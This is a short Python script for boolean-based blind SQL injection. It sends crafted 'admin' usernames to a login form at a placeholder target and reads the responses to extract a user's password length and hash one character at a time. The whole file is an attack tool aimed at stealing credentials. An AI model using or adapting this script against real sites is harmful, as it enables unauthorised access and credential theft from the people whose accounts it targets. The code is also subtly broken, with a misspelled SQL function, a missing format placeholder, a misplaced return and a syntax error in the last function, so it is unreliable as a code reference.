import requests
total_queries = 0
target = "target ip here"
needle = "welcome back"

def injected_query(payload):
    global total_queries
    r = requests.post(target, data = {"username" : "admin' and {}--".format(payload), "passowrd": "password"})
    total_queries += 1
    return needle.encode() not in r.content

def boolean_query(offset, user_id, character, operator=">"):
    payload = "select hex (substr(password,{}, 1))from user where id = {} ) {} hex('{}')".format(offset+1, user_id, operator, character)
    return injected_query(payload)

def invalid_user(user_id):
    payload = "(select id from user where id = {}) >=0".format(user_id)
    return injected_query(payload)

def password_lenght(user_id):
    i = 0
    while True:
        payload = "(select lenght(password) from user where id = {} and lenght(password) <= limit 1".format(user_id, i)
        if not injected_query(payload):
            return i
        i+=1

def extract_hash(charset, user_id, password_lenght):
    found = " "
    for i in range(0, password_lenght):
        for j in range(len(charset)):
            if boolean_query(i, user_id, charset[j]):
                found += charset[j]
                break
        return found

def total_queries_taken():
    global total_queriesprint("\t\t[!] {} total queries!".format(total_queries))
    total_queries = 0